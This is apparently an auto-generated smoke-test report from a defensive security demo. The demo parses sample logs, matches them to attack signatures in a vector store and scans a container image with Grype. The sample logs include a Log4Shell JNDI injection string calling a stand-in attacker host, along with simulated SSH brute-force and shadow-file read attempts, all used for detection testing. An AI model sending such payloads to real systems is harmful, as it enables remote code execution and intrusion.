# Cybersecurity E2E Smoke Demo Report

Generated: 2026-04-19T15:51:47.841Z

This report is produced by `npm run demo:security`. It exercises a
four-stage defensive workflow using tools already shipped in
`ai-agent-os`:

1. Long-term memory via the unified VectorStore interface (Chroma v2).
2. Short-term log parsing of a syslog-style feed.
3. Contextual correlation between live events and seeded attack
   signatures using cosine similarity.
4. Container vulnerability scanning with Grype (PR #4).

## Stage 1 — Seed attack signatures into long-term memory

Backend: `chroma` | Collection: `doge-demo-signatures` | Dim: 13

| ID | Name | Technique |
|----|------|-----------|
| `sig-log4shell` | Log4Shell | CVE-2021-44228 — JNDI lookup injection (T1190) |
| `sig-ssh-bruteforce` | SSH Brute Force | T1110 — Credential Access via sshd |
| `sig-privesc-sudo` | Sudo Privilege Escalation | T1548.003 — Abuse Elevation Control Mechanism: Sudo |

## Stage 2 — Parse short-term log feed

Ingested 7 line(s). Flagged 5 as suspicious.

| Line | Severity | Host | Process | Message |
|------|----------|------|---------|---------|
| 1 | critical | `web-01` | `nginx` | `10.0.0.42 - - [18/Apr/2026:10:01:12 +0000] "GET /api/search?q=${jndi:ldap://attacker.example/Exploit} HTTP/1.1" 200` |
| 2 | info | `web-01` | `nginx` | `10.0.0.42 - - [18/Apr/2026:10:01:15 +0000] "GET / HTTP/1.1" 200` |
| 3 | critical | `bastion` | `sshd[4421]` | `Failed password for invalid user root from 203.0.113.7 port 51022 ssh2` |
| 4 | critical | `bastion` | `sshd[4421]` | `Failed password for invalid user root from 203.0.113.7 port 51022 ssh2` |
| 5 | critical | `bastion` | `sshd[4421]` | `Failed password for invalid user admin from 203.0.113.7 port 51022 ssh2` |
| 6 | critical | `app-02` | `sudo` | `alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow` |
| 7 | info | `app-02` | `cron` | `(root) CMD (/usr/local/bin/cleanup.sh)` |

## Stage 3 — Correlate live events with long-term memory

| Line | Event | Matched Signature | Score |
|------|-------|-------------------|-------|
| 1 | `10.0.0.42 - - [18/Apr/2026:10:01:12 +0000] "GET /api/search?q=${jndi:ldap://attacker.example/Exploit` | Log4Shell (sig-log4shell) | 0.414 |
| 3 | `Failed password for invalid user root from 203.0.113.7 port 51022 ssh2` | SSH Brute Force (sig-ssh-bruteforce) | 0.414 |
| 4 | `Failed password for invalid user root from 203.0.113.7 port 51022 ssh2` | SSH Brute Force (sig-ssh-bruteforce) | 0.414 |
| 5 | `Failed password for invalid user admin from 203.0.113.7 port 51022 ssh2` | SSH Brute Force (sig-ssh-bruteforce) | 0.414 |
| 6 | `alice : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow` | Sudo Privilege Escalation (sig-privesc-sudo) | 0.414 |

## Stage 4 — Container vulnerability scan

Log4Shell correlation detected — pivoting to container scan of `alpine:3.14` to find vulnerable dependencies.

```
grype: 59 vuln(s) in alpine:3.14 | Medium=29 High=20 Critical=4 Low=4 Unknown=2
  [Medium] CVE-2023-2650 libcrypto1.1@1.1.1t-r2 cvss=6.5
  [Medium] CVE-2023-2650 libssl1.1@1.1.1t-r2 cvss=6.5
  [Critical] CVE-2024-5535 libcrypto1.1@1.1.1t-r2 cvss=9.1
  [Critical] CVE-2024-5535 libssl1.1@1.1.1t-r2 cvss=9.1
  [Medium] CVE-2024-2511 libcrypto1.1@1.1.1t-r2 cvss=5.9
  [Medium] CVE-2024-2511 libssl1.1@1.1.1t-r2 cvss=5.9
  [Critical] CVE-2022-48174 busybox@1.33.1-r8 cvss=9.8
  [Critical] CVE-2022-48174 ssl_client@1.33.1-r8 cvss=9.8
  [High] CVE-2023-4807 libcrypto1.1@1.1.1t-r2 cvss=7.8
  [High] CVE-2023-4807 libssl1.1@1.1.1t-r2 cvss=7.8
  … +49 more (truncated).
```

## Stage Summary

- PASS — **seed-memory**: Seeded 3 signatures into chroma:doge-demo-signatures.
- PASS — **parse-logs**: 7 events parsed, 5 flagged for correlation.
- PASS — **correlate**: Recognised 5 of 5 suspicious events as known patterns.
- PASS — **container-scan**: Scanned alpine:3.14; summary line: grype: 59 vuln(s) in alpine:3.14 | Medium=29 High=20 Critical=4 Low=4 Unknown=2
